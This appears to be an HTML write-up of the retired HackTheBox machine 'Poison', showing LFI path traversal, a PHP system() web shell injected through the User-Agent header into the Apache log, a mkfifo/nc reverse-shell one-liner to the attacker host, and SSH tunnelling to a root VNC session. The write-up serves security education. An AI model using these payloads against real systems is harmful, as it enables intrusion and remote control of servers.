@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Poison &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Poison</h1>
+    <div class="meta">Target: <code>10.10.14.92</code></div>
+    <div class="tags"><span class="tag">FreeBSD</span><span class="tag">PHP</span><span class="tag">LFI</span><span class="tag">LogPoisoning</span><span class="tag">base64</span><span class="tag">credentialhunting</span><span class="tag">VNC</span><span class="tag">SSHtunneling</span><span class="tag">SSH</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#lfi-confirmed">LFI Confirmed</a><a class="lvl3" href="#decoding-the-password">Decoding the Password</a><a class="lvl3" href="#log-poisoning-rce-as-www">Log Poisoning → RCE as www</a><a class="lvl3" href="#ssh-as-charix">SSH as charix</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#vnc-running-as-root-on-localhost">VNC Running as Root on Localhost</a><a class="lvl3" href="#recovering-the-vnc-password-file">Recovering the VNC Password File</a><a class="lvl3" href="#ssh-port-forwarding-vnc-authentication-as-root">SSH Port Forwarding + VNC Authentication as Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Poison is a medium FreeBSD box with a classic two-stage web exploitation chain. A PHP file-inclusion parameter on a testing site enables LFI; a plaintext-ish password stored base64-encoded thirteen times is found in a directory listing exposed by the same LFI. Log poisoning turns the LFI into RCE by injecting PHP into the Apache access log through a crafted User-Agent. The user flag comes from SSH with the decoded password. Root is held by a VNC server running as root on localhost; SSH port-forwarding plus a <code>secret</code> archive file (encrypted with the user's password) provides the VNC password file to connect.</p>
+<h2 id="recon">Recon</h2>
+<p>The landing page described itself as "Temporary website to test local .php scripts" with a <code>Scriptname</code> text box and a list of test pages. The URL pattern when selecting any page:</p>
+<pre><code>http://10.129.1.254/browse.php?file=listfiles.php
+</code></pre>
+<p><code>listfiles.php</code> returned an array of files in the directory:</p>
+<pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; browse.php [3] =&gt; index.php
+        [4] =&gt; info.php [5] =&gt; ini.php [6] =&gt; listfiles.php
+        [7] =&gt; phpinfo.php [8] =&gt; pwdbackup.txt )
+</code></pre>
+<p><code>pwdbackup.txt</code> was unexpected. Entering it in the Scriptname box returned a large base64 blob with a comment: "This password is secure, it's encoded atleast 13 times."</p>
+<p><code>phpinfo.php</code> confirmed <code>allow_url_include = Off</code>, ruling out direct RFI.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="lfi-confirmed">LFI Confirmed</h3>
+<pre><code class="language-sh">http://10.129.1.254/browse.php?file=../../../../../../../etc/passwd
+</code></pre>
+<p>Success, the full FreeBSD <code>/etc/master.passwd</code> content was returned, revealing user <code>charix</code> at UID 1001.</p>
+<h3 id="decoding-the-password">Decoding the Password</h3>
+<p>The blob in <code>pwdbackup.txt</code> was base64-decoded iteratively 13 times:</p>
+<pre><code class="language-sh">data=$(cat pwd.b64)
+for i in $(seq 1 13); do
+  data=$(echo $data | tr -d ' ' | base64 -d)
+done
+echo $data
+‹redacted›
+</code></pre>
+<h3 id="log-poisoning-rce-as-www">Log Poisoning → RCE as www</h3>
+<p>LFI gives read access to Apache's access log. By injecting PHP into the <code>User-Agent</code> header, that PHP gets written into the log file. Subsequent LFI requests to the log file execute the injected code:</p>
+<pre><code>GET / HTTP/1.1
+User-Agent: Firefox: &lt;?php system($_GET['c']); ?&gt;
+</code></pre>
+<p>After sending that request, reading the log via LFI with a <code>c</code> parameter:</p>
+<pre><code>http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&amp;c=id
+</code></pre>
+<p>Output at the bottom of the log:</p>
+<pre><code>10.10.14.92 - - [18/Sep/2024:18:50:46 +0200] &quot;GET / HTTP/1.1&quot; 200 289 &quot;-&quot; &quot;Firefox: uid=80(www) gid=80(www) groups=80(www)
+</code></pre>
+<blockquote>
+<p><strong>Why log poisoning works:</strong> the PHP interpreter evaluates <code>&lt;?php system($_GET['c']); ?&gt;</code> whenever it appears in a file that is <code>include()</code>d or <code>file_get_contents()</code>d. The access log is a plain text file that records every request including headers. By poisoning the log with PHP code via the User-Agent, any subsequent LFI that reads the log file triggers execution. The log must be in a path PHP can include, and the webserver must have PHP processing enabled for the include path.</p>
+</blockquote>
+<p><code>nc -e</code> was not available on FreeBSD's default <code>nc</code>. The mkfifo pipe trick worked:</p>
+<pre><code class="language-sh">http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&amp;c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.92%2053%20%3E/tmp/f
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [10.10.14.92] from (UNKNOWN) [10.129.1.254] 62885
+$ whoami
+www
+</code></pre>
+<h3 id="ssh-as-charix">SSH as charix</h3>
+<p>The decoded password worked directly over SSH:</p>
+<pre><code class="language-sh">ssh charix@10.129.1.254
+# Password: ‹redacted›
+charix@Poison:~ % whoami
+charix
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="vnc-running-as-root-on-localhost">VNC Running as Root on Localhost</h3>
+<p><code>ps aux</code> showed a TightVNC server on display <code>:1</code> (port 5901) running as root:</p>
+<pre><code class="language-sh">root    608  Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes \
+  -auth /root/.Xauthority -geometry 1280x800 -depth 24 \
+  -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost
+</code></pre>
+<p>VNC was listening only on localhost, so direct connection from Kali was blocked.</p>
+<h3 id="recovering-the-vnc-password-file">Recovering the VNC Password File</h3>
+<p><code>charix</code>'s home directory contained <code>secret.zip</code>. It transferred back to Kali via FTP (a Python <code>pyftpdlib</code> server on Kali, then <code>ftp put</code> from the box):</p>
+<pre><code class="language-sh"># Kali
+python -m pyftpdlib -p 21 -w
+
+# Target
+ftp 10.10.14.92
+ftp&gt; put secret.zip
+</code></pre>
+<p>Unzipping with the charix password:</p>
+<pre><code class="language-sh">unzip -P '‹redacted›' secret.zip
+# extracts: secret
+</code></pre>
+<p><code>secret</code> is a binary VNC password file.</p>
+<h3 id="ssh-port-forwarding-vnc-authentication-as-root">SSH Port Forwarding + VNC Authentication as Root</h3>
+<pre><code class="language-sh">ssh -N -L 34500:127.0.0.1:5901 charix@10.129.1.254
+</code></pre>
+<pre><code class="language-sh">vncviewer 127.0.0.1::34500 -passwd secret
+# Authentication successful
+# Desktop name &quot;root's X desktop (Poison:1)&quot;
+</code></pre>
+<blockquote>
+<p><strong>Why the <code>secret</code> file works as the VNC password:</strong> VNC stores the connection password as a fixed-key DES encrypted binary (same weakness as in Cascade). The <code>secret</code> file is that encrypted binary in exactly the format <code>vncviewer -passwd</code> expects. No cracking needed; it's passed directly as the credential material.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<p>VNC connected as root's desktop. Box rooted through the graphical session.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>LFI + access log = RCE.</strong> Inject PHP into any log the server reads via <code>include()</code>. The User-Agent header is the cleanest injection point because it's always logged and allows arbitrary characters.</li>
+<li><strong>Thirteen rounds of base64 is still reversible in a loop.</strong> Obfuscation by encoding depth is not security; a one-liner unwraps it.</li>
+<li><strong>Processes listening on localhost are still reachable via SSH port forwarding.</strong> Any service bound to <code>127.0.0.1</code> on a box where you have SSH is effectively accessible from your attacker machine.</li>
+<li><strong>VNC password files are DES-encrypted with a static key.</strong> A <code>-passwd</code> file can be used directly by <code>vncviewer</code> without decrypting it; finding the file is the same as finding the password.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
